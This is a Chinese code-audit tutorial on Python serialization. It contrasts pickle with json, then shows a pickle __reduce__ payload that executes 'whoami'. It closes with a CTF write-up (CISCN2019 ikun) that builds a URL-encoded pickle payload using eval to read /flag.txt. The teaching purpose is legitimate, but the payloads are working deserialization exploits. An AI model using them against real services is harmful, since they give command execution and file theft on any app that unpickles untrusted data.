# 代码审计

## 一、审计基础

### 1、反序列化

`python`中序列化一般有两种方式：`pickle`模块和`json`模块，前者是`python`特有的格式，后者是`json`通用的格式。

以下均显示为`python2`版本序列化输出结果，`python3`的`pickle.dumps`结果与`python2`不一样。

**pickle**

```text
import pickle

dict = {"name": 'zjun', "age": 19}
a = pickle.dumps(dict)
print(a, type(a))
b = pickle.loads(a)
print(b, type(b))
```

输出：

```text
("(dp0\nS'age'\np1\nI19\nsS'name'\np2\nS'zjun'\np3\ns.", <type 'str'>)
({'age': 19, 'name': 'zjun'}, <type 'dict'>)
```

**json**

```text
import json
dict = {"name": 'zjun', "age": 19}
a = json.dumps(dict, indent=4)
print(a, type(a))
b = json.loads(a)
print(b, type(b))
```

其中`indent=4`起到一个数据格式化输出的效果，当数据多了就显得更为直观，输出：

```text
{
    "name": "zjun",
    "age": 19
} <class 'str'>
{'name': 'zjun', 'age': 19} <class 'dict'>
```

再看看一个`pickle`模块导致的安全问题

```text
import pickle
import os

class obj(object):
    def __reduce__(self):
        a = 'whoami'
        return (os.system, (a, ))

r = pickle.dumps(obj())
print(r)
pickle.loads(r)
```

通过构造`__reduce__`可达到命令执行的目的，详见：[Python魔法方法指南](https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html)

![](https://xzfile.aliyuncs.com/media/upload/picture/20200809201530-046eea10-da3a-1.png)

先输出`obj`对象的序列化结果，再将其反序列化，输出

```text
cposix
system
p0
(S'whoami'
p1
tp2
Rp3
.
zjun
```

成功执行了`whoami`命令。

**实例：CISCN2019 华北赛区 Day1 Web2 ikun**

[CISCN2019 华北赛区 Day1 Web2 ikun](https://www.zjun.info/2019/ikun.html)，前面的细节讲得很清楚了，这里接着看反序列化的考点。

![](https://xzfile.aliyuncs.com/media/upload/picture/20200809201533-0664f3aa-da3a-1.png)

第`19`行处直接接收`become`经`url`解码与其反序列化的内容，存在反序列化漏洞，构造`payload`读取`flag.txt`文件：

```text
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)
```

```text
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

将生成的`payload`传给`become`即可。

